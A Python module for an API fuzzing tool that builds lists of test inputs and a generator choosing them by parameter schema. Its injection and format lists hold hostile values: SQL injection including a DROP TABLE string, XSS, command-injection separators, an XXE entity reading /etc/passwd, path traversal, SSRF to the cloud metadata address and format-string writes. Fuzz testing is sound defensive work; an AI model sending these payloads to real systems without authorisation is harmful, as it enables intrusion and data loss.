"""
Payload Generator
Generates fuzz payloads for various attack types.
Ported from fuzzer-mcp/src/payload-generator.ts
"""

from __future__ import annotations

import sys
import json
from typing import Any, Dict, List, Optional


# ---------------------------------------------------------------------------
# Boundary value payloads - test edge cases
# ---------------------------------------------------------------------------
BOUNDARY_PAYLOADS: list[dict[str, Any]] = [
    {"value": "", "type": "boundary", "description": "Empty string"},
    {"value": None, "type": "boundary", "description": "Null value"},
    {"value": None, "type": "boundary", "description": "Undefined value (None)"},
    {"value": 0, "type": "boundary", "description": "Zero"},
    {"value": -1, "type": "boundary", "description": "Negative one"},
    {"value": 1, "type": "boundary", "description": "One"},
    {"value": -2147483648, "type": "boundary", "description": "INT32_MIN"},
    {"value": 2147483647, "type": "boundary", "description": "INT32_MAX"},
    {"value": -9007199254740991, "type": "boundary", "description": "JS MIN_SAFE_INTEGER"},
    {"value": 9007199254740991, "type": "boundary", "description": "JS MAX_SAFE_INTEGER"},
    {"value": sys.maxsize, "type": "boundary", "description": "MAX_VALUE (sys.maxsize)"},
    {"value": 5e-324, "type": "boundary", "description": "MIN_VALUE (smallest positive float)"},
    {"value": float("inf"), "type": "boundary", "description": "Infinity"},
    {"value": float("-inf"), "type": "boundary", "description": "Negative Infinity"},
    {"value": float("nan"), "type": "boundary", "description": "NaN"},
    {"value": " ", "type": "boundary", "description": "Single space"},
    {"value": "   ", "type": "boundary", "description": "Multiple spaces"},
    {"value": "\t", "type": "boundary", "description": "Tab character"},
    {"value": "\n", "type": "boundary", "description": "Newline character"},
    {"value": "\r\n", "type": "boundary", "description": "CRLF"},
    {"value": "\0", "type": "boundary", "description": "Null byte"},
    {"value": [], "type": "boundary", "description": "Empty array"},
    {"value": {}, "type": "boundary", "description": "Empty object"},
    {"value": [None], "type": "boundary", "description": "Array with null"},
    {"value": False, "type": "boundary", "description": "Boolean false"},
    {"value": True, "type": "boundary", "description": "Boolean true"},
]


# ---------------------------------------------------------------------------
# Type confusion payloads - test type handling
# ---------------------------------------------------------------------------
TYPE_CONFUSION_PAYLOADS: list[dict[str, Any]] = [
    {"value": "1", "type": "type_confusion", "description": "String one (for numeric)"},
    {"value": "0", "type": "type_confusion", "description": "String zero (for numeric)"},
    {"value": "-1", "type": "type_confusion", "description": "String negative one"},
    {"value": "true", "type": "type_confusion", "description": "String true"},
    {"value": "false", "type": "type_confusion", "description": "String false"},
    {"value": "null", "type": "type_confusion", "description": "String null"},
    {"value": "undefined", "type": "type_confusion", "description": "String undefined"},
    {"value": 1, "type": "type_confusion", "description": "Number for string"},
    {"value": True, "type": "type_confusion", "description": "Boolean for string"},
    {"value": ["array"], "type": "type_confusion", "description": "Array for string"},
    {"value": {"key": "value"}, "type": "type_confusion", "description": "Object for string"},
    {"value": '{"json":"string"}', "type": "type_confusion", "description": "JSON string"},
    {"value": "[1,2,3]", "type": "type_confusion", "description": "Array string"},
    {"value": "1.5", "type": "type_confusion", "description": "Decimal string"},
    {"value": "1e10", "type": "type_confusion", "description": "Scientific notation string"},
    {"value": "0x10", "type": "type_confusion", "description": "Hex string"},
    {"value": "0b10", "type": "type_confusion", "description": "Binary string"},
    {"value": "0o10", "type": "type_confusion", "description": "Octal string"},
]


# ---------------------------------------------------------------------------
# Injection payloads - test for various injection vulnerabilities
# ---------------------------------------------------------------------------
INJECTION_PAYLOADS: list[dict[str, Any]] = [
    # SQL Injection
    {"value": "'", "type": "injection", "description": "Single quote (SQL)", "risk_indicator": "sqli"},
    {"value": "''", "type": "injection", "description": "Double single quote (SQL)", "risk_indicator": "sqli"},
    {"value": "' OR '1'='1", "type": "injection", "description": "SQL OR injection", "risk_indicator": "sqli"},
    {"value": "' OR 1=1--", "type": "injection", "description": "SQL comment injection", "risk_indicator": "sqli"},
    {"value": "'; DROP TABLE users;--", "type": "injection", "description": "SQL DROP injection", "risk_indicator": "sqli"},
    {"value": "1' AND '1'='1", "type": "injection", "description": "SQL AND injection", "risk_indicator": "sqli"},
    {"value": "1; SELECT * FROM users", "type": "injection", "description": "SQL UNION injection", "risk_indicator": "sqli"},
    {"value": "/**/", "type": "injection", "description": "SQL comment", "risk_indicator": "sqli"},
    {"value": "1/**/OR/**/1=1", "type": "injection", "description": "SQL comment bypass", "risk_indicator": "sqli"},

    # XSS
    {"value": "<script>alert(1)</script>", "type": "injection", "description": "XSS script tag", "risk_indicator": "xss"},
    {"value": '"><script>alert(1)</script>', "type": "injection", "description": "XSS attribute break", "risk_indicator": "xss"},
    {"value": "javascript:alert(1)", "type": "injection", "description": "XSS javascript URI", "risk_indicator": "xss"},
    {"value": "<img src=x onerror=alert(1)>", "type": "injection", "description": "XSS img onerror", "risk_indicator": "xss"},
    {"value": "<svg onload=alert(1)>", "type": "injection", "description": "XSS svg onload", "risk_indicator": "xss"},
    {"value": "'+alert(1)+'", "type": "injection", "description": "XSS string context", "risk_indicator": "xss"},
    {"value": "</title><script>alert(1)</script>", "type": "injection", "description": "XSS title break", "risk_indicator": "xss"},

    # Command Injection
    {"value": "; ls", "type": "injection", "description": "Command injection semicolon", "risk_indicator": "cmdi"},
    {"value": "| ls", "type": "injection", "description": "Command injection pipe", "risk_indicator": "cmdi"},
    {"value": "`ls`", "type": "injection", "description": "Command injection backtick", "risk_indicator": "cmdi"},
    {"value": "$(ls)", "type": "injection", "description": "Command injection subshell", "risk_indicator": "cmdi"},
    {"value": "& ls", "type": "injection", "description": "Command injection ampersand", "risk_indicator": "cmdi"},
    {"value": "\n ls", "type": "injection", "description": "Command injection newline", "risk_indicator": "cmdi"},

    # LDAP Injection
    {"value": "*", "type": "injection", "description": "LDAP wildcard", "risk_indicator": "ldapi"},
    {"value": "*)(&", "type": "injection", "description": "LDAP filter injection", "risk_indicator": "ldapi"},

    # XPath Injection
    {"value": "' or '1'='1", "type": "injection", "description": "XPath injection", "risk_indicator": "xpathi"},

    # Template Injection
    {"value": "{{7*7}}", "type": "injection", "description": "Template injection (Jinja/Django)", "risk_indicator": "ssti"},
    {"value": "${7*7}", "type": "injection", "description": "Template injection (Spring/Freemarker)", "risk_indicator": "ssti"},
    {"value": "#{7*7}", "type": "injection", "description": "Template injection (Ruby/ERB)", "risk_indicator": "ssti"},
    {"value": "<%= 7*7 %>", "type": "injection", "description": "Template injection (ASP/EJS)", "risk_indicator": "ssti"},
]


# ---------------------------------------------------------------------------
# Format payloads - test input format handling
# ---------------------------------------------------------------------------
FORMAT_PAYLOADS: list[dict[str, Any]] = [
    # JSON
    {"value": "{", "type": "format", "description": "Incomplete JSON object"},
    {"value": "[", "type": "format", "description": "Incomplete JSON array"},
    {"value": '{"key": }', "type": "format", "description": "Invalid JSON value"},
    {"value": '{"key": undefined}', "type": "format", "description": "JSON with undefined"},
    {"value": "{'key': 'value'}", "type": "format", "description": "JSON with single quotes"},

    # XML
    {"value": '<?xml version="1.0"?>', "type": "format", "description": "XML declaration"},
    {"value": "<!DOCTYPE foo>", "type": "format", "description": "DOCTYPE declaration"},
    {"value": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "type": "format", "description": "XXE payload", "risk_indicator": "xxe"},
    {"value": "<![CDATA[<script>alert(1)</script>]]>", "type": "format", "description": "CDATA with script"},
    {"value": "&lt;script&gt;", "type": "format", "description": "HTML entities"},

    # Path traversal
    {"value": "../", "type": "format", "description": "Path traversal", "risk_indicator": "lfi"},
    {"value": "..\\", "type": "format", "description": "Path traversal (Windows)", "risk_indicator": "lfi"},
    {"value": "....//....//etc/passwd", "type": "format", "description": "Nested path traversal", "risk_indicator": "lfi"},
    {"value": "/etc/passwd", "type": "format", "description": "Absolute path", "risk_indicator": "lfi"},
    {"value": "file:///etc/passwd", "type": "format", "description": "File URI", "risk_indicator": "lfi"},

    # URL/Protocol
    {"value": "http://127.0.0.1", "type": "format", "description": "SSRF localhost", "risk_indicator": "ssrf"},
    {"value": "http://169.254.169.254", "type": "format", "description": "SSRF AWS metadata", "risk_indicator": "ssrf"},
    {"value": "gopher://localhost", "type": "format", "description": "Gopher protocol", "risk_indicator": "ssrf"},
    {"value": "dict://localhost:11211", "type": "format", "description": "Dict protocol", "risk_indicator": "ssrf"},

    # Unicode
    {"value": "\u0000", "type": "format", "description": "Unicode null"},
    {"value": "\ufffd", "type": "format", "description": "Unicode replacement char"},
    {"value": "\ud800", "type": "format", "description": "Unicode surrogate"},
    {"value": "\u2122\u00ae\u00a9", "type": "format", "description": "Unicode symbols"},
    {"value": "\u4f60\u597d", "type": "format", "description": "Chinese characters"},
    {"value": "\U0001f525", "type": "format", "description": "Emoji"},
]


# ---------------------------------------------------------------------------
# Overflow payloads - test buffer/size limits
# ---------------------------------------------------------------------------
OVERFLOW_PAYLOADS: list[dict[str, Any]] = [
    {"value": "A" * 256, "type": "overflow", "description": "Long string (256)"},
    {"value": "A" * 1024, "type": "overflow", "description": "Long string (1024)"},
    {"value": "A" * 4096, "type": "overflow", "description": "Long string (4096)"},
    {"value": "A" * 65536, "type": "overflow", "description": "Long string (65536)"},
    {"value": "A" * 1000000, "type": "overflow", "description": "Long string (1M)"},
    {"value": "%s" * 100, "type": "overflow", "description": "Format string attack"},
    {"value": "%n" * 100, "type": "overflow", "description": "Format string write"},
    {"value": "%x" * 100, "type": "overflow", "description": "Format string hex"},
    {"value": ",".join(["a"] * 100), "type": "overflow", "description": "Many array elements"},
    {"value": ",".join(["a"] * 1000), "type": "overflow", "description": "Many array elements (1000)"},
    {"value": "0" * 1000, "type": "overflow", "description": "Large number string"},
    {"value": "9" * 1000, "type": "overflow", "description": "Large decimal string"},
]


# ---------------------------------------------------------------------------
# All payloads by type
# ---------------------------------------------------------------------------
def _build_sqli_db_payloads() -> list[dict[str, Any]]:
    """Build sqli_db payloads from sql_payloads module (lazy)."""
    try:
        from lib.sql_payloads import get_all_payloads_flat
        return [
            {
                "value": p.payload,
                "type": "sqli_db",
                "description": p.description,
                "risk_indicator": "sqli",
                "db_type": p.db_type,
                "technique": p.technique,
                "waf_bypass": p.waf_bypass,
            }
            for p in get_all_payloads_flat()
        ]
    except ImportError:
        return []


# Lazy-initialized sqli_db payloads
_SQLI_DB_PAYLOADS: Optional[list[dict[str, Any]]] = None


def _get_sqli_db_payloads() -> list[dict[str, Any]]:
    global _SQLI_DB_PAYLOADS
    if _SQLI_DB_PAYLOADS is None:
        _SQLI_DB_PAYLOADS = _build_sqli_db_payloads()
    return _SQLI_DB_PAYLOADS


PAYLOADS_BY_TYPE: dict[str, list[dict[str, Any]]] = {
    "boundary": BOUNDARY_PAYLOADS,
    "type_confusion": TYPE_CONFUSION_PAYLOADS,
    "injection": INJECTION_PAYLOADS,
    "format": FORMAT_PAYLOADS,
    "overflow": OVERFLOW_PAYLOADS,
    # sqli_db is resolved lazily via get_payloads_by_type
}


class PayloadGenerator:
    """Generates fuzz payloads for API parameter testing."""

    def __init__(self, max_payloads: int = 100) -> None:
        self.max_payloads = max_payloads

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def get_payloads_by_type(self, type_name: str) -> list[dict[str, Any]]:
        """Get all payloads of a specific type."""
        if type_name == "sqli_db":
            return _get_sqli_db_payloads()
        return PAYLOADS_BY_TYPE.get(type_name, [])

    def get_payload_types(self) -> list[str]:
        """Get all available payload types."""
        return list(PAYLOADS_BY_TYPE.keys()) + ["sqli_db"]

    def get_payloads(self, types: Optional[list[str]] = None) -> list[dict[str, Any]]:
        """Get payloads for multiple types, limited to *max_payloads*."""
        target_types = types or self.get_payload_types()
        payloads: list[dict[str, Any]] = []
        for t in target_types:
            payloads.extend(self.get_payloads_by_type(t))
        return payloads[: self.max_payloads]

    def generate_for_parameter(
        self,
        param: dict[str, Any],
        types: Optional[list[str]] = None,
    ) -> list[dict[str, Any]]:
        """Generate schema-aware payloads based on parameter constraints."""
        payloads: list[dict[str, Any]] = []
        target_types = types or self.get_payload_types()

        if "boundary" in target_types:
            payloads.extend(self._generate_boundary_payloads(param))

        if "type_confusion" in target_types:
            payloads.extend(self._generate_type_confusion_payloads(param))

        if "injection" in target_types and self._is_string_type(param.get("type", "")):
            payloads.extend(INJECTION_PAYLOADS)

        if "format" in target_types:
            payloads.extend(self._generate_format_payloads(param))

        if "overflow" in target_types and self._is_string_type(param.get("type", "")):
            payloads.extend(self._generate_overflow_payloads(param))

        return payloads[: self.max_payloads]

    def get_payload_type_descriptions(self) -> dict[str, str]:
        """Return human-readable descriptions for each payload type."""
        return {
            "boundary": "Edge cases like empty, null, min/max values",
            "type_confusion": "Wrong types to test type handling",
            "injection": "SQL, XSS, command injection payloads",
            "format": "Malformed data, path traversal, protocol handlers",
            "overflow": "Long strings, large numbers, format strings",
            "sqli_db": "DB-specific SQL injection payloads (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) with WAF bypass variants",
        }

    def get_db_payloads(
        self,
        db_type: str = "generic",
        technique: Optional[str] = None,
    ) -> list[dict[str, Any]]:
        """Get DB-specific SQL injection payloads.

        Parameters
        ----------
        db_type : str
            Database type: mysql, postgresql, mssql, oracle, sqlite, generic.
        technique : str, optional
            Injection technique: union, error_based, blind_boolean, blind_time, stacked.
        """
        try:
            from lib.sql_payloads import get_sql_payloads
            payloads = get_sql_payloads(db_type=db_type, technique=technique)
            return [
                {
                    "value": p.payload,
                    "type": "sqli_db",
                    "description": p.description,
                    "risk_indicator": "sqli",
                    "db_type": p.db_type,
                    "technique": p.technique,
                    "waf_bypass": p.waf_bypass,
                }
                for p in payloads
            ]
        except ImportError:
            return []

    def get_payload_examples(self, type_name: str) -> list[str]:
        """Return the first 5 example value strings (truncated to 50 chars)."""
        payloads = self.get_payloads_by_type(type_name)
        examples: list[str] = []
        for p in payloads[:5]:
            val = p["value"]
            if val is None:
                val_str = "null"
            elif isinstance(val, str):
                val_str = val
            else:
                val_str = json.dumps(val)
            if len(val_str) > 50:
                val_str = val_str[:47] + "..."
            examples.append(val_str)
        return examples

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _is_string_type(param_type: str) -> bool:
        """Check if a parameter type is string-like."""
        return param_type.lower() in ("string", "text", "varchar", "char")

    def _generate_boundary_payloads(self, param: dict[str, Any]) -> list[dict[str, Any]]:
        """Generate boundary payloads based on parameter constraints."""
        payloads: list[dict[str, Any]] = list(BOUNDARY_PAYLOADS)

        # Enum boundaries
        enum_values = param.get("enum")
        if enum_values and len(enum_values) > 0:
            payloads.append({
                "value": "invalid_enum_value_12345",
                "type": "boundary",
                "description": "Invalid enum value",
            })

        # Numeric boundaries
        minimum = param.get("minimum")
        if minimum is not None:
            payloads.append({
                "value": minimum - 1,
                "type": "boundary",
                "description": f"Below minimum ({minimum})",
            })
            payloads.append({
                "value": minimum,
                "type": "boundary",
                "description": f"At minimum ({minimum})",
            })

        maximum = param.get("maximum")
        if maximum is not None:
            payloads.append({
                "value": maximum + 1,
                "type": "boundary",
                "description": f"Above maximum ({maximum})",
            })
            payloads.append({
                "value": maximum,
                "type": "boundary",
                "description": f"At maximum ({maximum})",
            })

        # String length boundaries
        min_length = param.get("minLength")
        if min_length is not None:
            if min_length > 0:
                payloads.append({
                    "value": "x" * (min_length - 1),
                    "type": "boundary",
                    "description": f"Below minLength ({min_length})",
                })
            payloads.append({
                "value": "x" * min_length,
                "type": "boundary",
                "description": f"At minLength ({min_length})",
            })

        max_length = param.get("maxLength")
        if max_length is not None:
            payloads.append({
                "value": "x" * max_length,
                "type": "boundary",
                "description": f"At maxLength ({max_length})",
            })
            payloads.append({
                "value": "x" * (max_length + 1),
                "type": "boundary",
                "description": f"Above maxLength ({max_length})",
            })

        return payloads

    def _generate_type_confusion_payloads(self, param: dict[str, Any]) -> list[dict[str, Any]]:
        """Generate type confusion payloads based on parameter type."""
        payloads: list[dict[str, Any]] = list(TYPE_CONFUSION_PAYLOADS)
        param_type = param.get("type", "").lower()

        if param_type in ("integer", "number"):
            payloads.append({"value": "1.5", "type": "type_confusion", "description": "Float for integer"})
            payloads.append({"value": "one", "type": "type_confusion", "description": "Word for number"})
        elif param_type == "boolean":
            payloads.append({"value": "1", "type": "type_confusion", "description": "String 1 for boolean"})
            payloads.append({"value": "0", "type": "type_confusion", "description": "String 0 for boolean"})
            payloads.append({"value": "yes", "type": "type_confusion", "description": "String yes for boolean"})
            payloads.append({"value": "no", "type": "type_confusion", "description": "String no for boolean"})
        elif param_type == "array":
            payloads.append({"value": "not_an_array", "type": "type_confusion", "description": "String for array"})
            payloads.append({"value": "[]", "type": "type_confusion", "description": "Empty array string"})
        elif param_type == "object":
            payloads.append({"value": "not_an_object", "type": "type_confusion", "description": "String for object"})
            payloads.append({"value": "{}", "type": "type_confusion", "description": "Empty object string"})

        return payloads

    def _generate_format_payloads(self, param: dict[str, Any]) -> list[dict[str, Any]]:
        """Generate format payloads based on parameter format."""
        payloads: list[dict[str, Any]] = list(FORMAT_PAYLOADS)
        fmt = (param.get("format") or "").lower()

        if fmt == "email":
            payloads.append({"value": "invalid@", "type": "format", "description": "Incomplete email"})
            payloads.append({"value": "@invalid.com", "type": "format", "description": "Email without user"})
            payloads.append({"value": "test@test@test.com", "type": "format", "description": "Double @ in email"})
        elif fmt in ("uri", "url"):
            payloads.append({"value": "not-a-url", "type": "format", "description": "Invalid URL"})
            payloads.append({"value": "javascript:alert(1)", "type": "format", "description": "JavaScript URL", "risk_indicator": "xss"})
        elif fmt in ("date", "date-time"):
            payloads.append({"value": "not-a-date", "type": "format", "description": "Invalid date"})
            payloads.append({"value": "9999-99-99", "type": "format", "description": "Invalid date values"})
            payloads.append({"value": "0000-00-00", "type": "format", "description": "Zero date"})
        elif fmt == "uuid":
            payloads.append({"value": "not-a-uuid", "type": "format", "description": "Invalid UUID"})
            payloads.append({"value": "00000000-0000-0000-0000-000000000000", "type": "format", "description": "Nil UUID"})

        return payloads

    def _generate_overflow_payloads(self, param: dict[str, Any]) -> list[dict[str, Any]]:
        """Generate overflow payloads based on parameter constraints."""
        payloads: list[dict[str, Any]] = list(OVERFLOW_PAYLOADS)

        max_length = param.get("maxLength")
        if max_length is not None:
            sizes = [
                max_length * 2,
                max_length * 10,
                max_length * 100,
            ]
            for size in sizes:
                if size <= 1_000_000:  # Limit to ~1 MB
                    payloads.append({
                        "value": "A" * size,
                        "type": "overflow",
                        "description": f"{size} chars ({round(size / max_length)}x maxLength)",
                    })

        return payloads


# Default instance for convenience
payload_generator = PayloadGenerator()
